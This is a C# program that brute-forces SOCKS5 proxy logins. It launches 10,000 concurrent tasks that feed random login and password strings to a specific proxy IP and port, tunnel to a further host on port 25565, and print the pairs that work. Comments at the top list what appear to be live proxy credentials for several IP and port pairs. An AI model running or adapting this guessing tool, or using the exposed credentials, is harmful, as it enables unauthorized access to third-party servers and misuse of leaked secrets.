using System.Collections.Concurrent;
using System.Net;
using System.Text;
using System.Threading.Channels;
using QuickProxyNet;
internal partial class Program
{

	private static int count = 0;

	private static async Task Main(string[] args)
	{

		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.228:9000

		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.228:9000
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.236:9001
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.228:9002
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.236:9003
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.228:9004
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.236:9005
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.228:9006
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.236:9007
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.228:9008
		//9bvR89p0zwMrt7q1:wifi;by;;;@23.109.113.236:9009





		//23.109.113.228:9000 

		//9bvR89p0zwMrt7q1
		//wifi;by;;;


		var g = new NetworkCredential();

		var tasks = new List<Task>();

		var passChannel = Channel.CreateBounded<string>(new BoundedChannelOptions(10_000)
		{
			SingleWriter = true
		});
		var loginChannel = Channel.CreateBounded<string>(new BoundedChannelOptions(10_000)
		{
			SingleWriter = true
		});

		s_logins = loginChannel.Reader;
		s_passes = passChannel.Reader;


		for (int i = 0; i < 10_000; i++)
		{
			tasks.Add(Core("23.109.113.228", 9000));
		}


		

		var w_task_log = Writer(loginChannel.Writer, 16);
		var w_task_pas = Writer(passChannel.Writer, 10);

		tasks.Add(w_task_log);
		tasks.Add(w_task_pas);

		await Task.WhenAll(tasks);

		await Task.Delay(-1);

	}

	private static async Task Writer(ChannelWriter<string> writer, int count)
	{
		 char[] alph = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM;_".ToCharArray();

		var buffer = new char[count];

		int counter = 0;

		Random random = new();

		while (true)
		{

			for (int i = 0; i < buffer.Length; i++)
			{
				var index = random.Next(0, alph.Length);

				buffer[i] = alph[index];
			}

			var s = new string(buffer);


			counter++;

			if(counter>=5000)
			{
				counter = 0;
				await Task.Yield();
			}

			await writer.WriteAsync(s);
		} 

	}

	static ChannelReader<string> s_passes;
	static ChannelReader<string> s_logins;

	private static async Task Core(string ip, int port)
	{
		try
		{
			while (true)
			{
				var login = await s_logins.ReadAsync();
				var pass = await s_passes.ReadAsync();
				try
				{


					Socks5Client client = new(ip, port, new NetworkCredential(login, pass));


					using var stream = await client.ConnectAsync("89.33.12.3", 25565);

					Console.WriteLine($"Succes: {login}:{pass}");
				}
				catch (Exception ex)
				{

				}
			}
		}
		catch(Exception ex)
		{
			Console.WriteLine(ex);
		}
	}



}
